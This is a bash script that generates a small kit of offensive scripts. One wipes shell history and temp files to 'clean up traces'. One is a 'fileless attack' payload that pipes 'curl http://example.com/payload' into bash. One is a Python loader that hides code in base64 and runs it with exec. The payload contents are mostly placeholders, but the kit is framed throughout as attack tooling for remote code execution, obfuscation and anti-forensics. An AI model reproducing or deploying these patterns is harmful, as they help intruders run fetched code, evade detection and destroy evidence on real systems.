#!/bin/bash

# Define the directory for scripts
SCRIPT_DIR="./scripts"

# Create the scripts directory if it doesn't exist
if [ ! -d "$SCRIPT_DIR" ]; then
  echo "Creating scripts directory..."
  mkdir -p "$SCRIPT_DIR"
fi

# Create cleanup.sh
cat <<EOL > "$SCRIPT_DIR/cleanup.sh"
#!/bin/bash
echo "Cleaning up traces..."
# Clear bash history
history -c
# Remove temporary files and logs
rm -rf /tmp/*
rm -rf /var/tmp/*
echo "Cleanup completed."
EOL

# Create some_script.py
cat <<EOL > "$SCRIPT_DIR/some_script.py"
# some_script.py
import os

def execute_payload():
    print("Executing payload!")
    os.system("echo 'Payload executed successfully!' > /tmp/payload_success.txt")

if __name__ == "__main__":
    execute_payload()
EOL

# Create payload (fileless attack script)
cat <<EOL > "$SCRIPT_DIR/payload"
#!/bin/bash
echo "Fileless attack executed!"
# Example payload
curl http://example.com/payload | bash
EOL

# Create obfuscated_script.py (Base64 encoded example)
BASE64_SCRIPT=$(base64 -w 0 "$SCRIPT_DIR/some_script.py")

cat <<EOL > "$SCRIPT_DIR/obfuscated_script.py"
import base64
exec(base64.b64decode('$BASE64_SCRIPT').decode('utf-8'))
EOL

# Set executable permissions for the scripts
chmod +x "$SCRIPT_DIR/cleanup.sh"
chmod +x "$SCRIPT_DIR/payload"

echo "All scripts have been created and added to the '$SCRIPT_DIR' directory."
